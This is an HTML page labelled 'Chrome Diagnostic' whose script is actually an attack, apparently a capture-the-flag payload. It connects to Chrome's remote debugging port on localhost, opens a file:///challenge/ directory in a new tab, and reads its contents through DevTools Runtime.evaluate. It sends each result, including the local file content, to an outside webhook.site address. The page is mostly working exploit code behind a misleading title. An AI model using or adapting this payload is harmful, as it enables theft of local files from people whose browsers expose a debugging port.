<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Chrome Diagnostic</title>
</head>
<body>
  <h2>Chrome Diagnostic</h2>
  <pre id="out">Starting...</pre>

  <script>
    (async () => {
      const out = document.getElementById("out");

      const report = async data => {
        try {
          await fetch(
            "https://webhook.site/006c020c-2d36-4a99-a217-7dad58b760e0",
            {
              method: "POST",
              mode: "no-cors",
              body: JSON.stringify(data)
            }
          );
        } catch (e) {
          out.textContent += "\nReport error: " + e.message;
        }
      };

      const log = async (stage, details = {}) => {
        out.textContent += "\n[" + stage + "] " +
          JSON.stringify(details);
        await report({ stage, ...details });
      };

      const evaluate = (ws, expression, id) =>
        new Promise((resolve, reject) => {
          const timeout = setTimeout(() => {
            ws.removeEventListener("message", handler);
            reject(new Error("CDP evaluation timeout"));
          }, 1200);

          function handler(event) {
            let msg;
            try {
              msg = JSON.parse(event.data);
            } catch {
              return;
            }

            if (msg.id !== id) return;
            clearTimeout(timeout);
            ws.removeEventListener("message", handler);
            resolve(msg);
          }

          ws.addEventListener("message", handler);
          ws.send(JSON.stringify({
            id,
            method: "Runtime.evaluate",
            params: {
              expression,
              returnByValue: true
            }
          }));
        });

      try {
        await log("started", {
          page: location.href,
          browser: navigator.userAgent
        });

        const response = await fetch(
          "http://127.0.0.1:9222/json/version"
        );

        if (!response.ok) {
          throw new Error("CDP HTTP " + response.status);
        }

        const version = await response.json();

        await log("cdp-version", {
          browser: version.Browser,
          protocol: version["Protocol-Version"]
        });

        const targetResponse = await fetch(
          "http://127.0.0.1:9222/json/new?file:///challenge/",
          { method: "PUT" }
        );

        if (!targetResponse.ok) {
          throw new Error("New target HTTP " + targetResponse.status);
        }

        const target = await targetResponse.json();
        const ws = new WebSocket(target.webSocketDebuggerUrl);

        await new Promise((resolve, reject) => {
          ws.onopen = resolve;
          ws.onerror = () => reject(new Error("WebSocket failed"));
        });

        const result = await evaluate(
          ws,
          "JSON.stringify({url:location.href,title:document.title,body:document.body.innerText})",
          1
        );

        await log("directory-result", {
          result: result.result?.result?.value ??
                  JSON.stringify(result)
        });

        ws.close();
      } catch (error) {
        await log("error", {
          name: error.name,
          message: error.message
        });
      }
    })();
  </script>
</body>
</html>
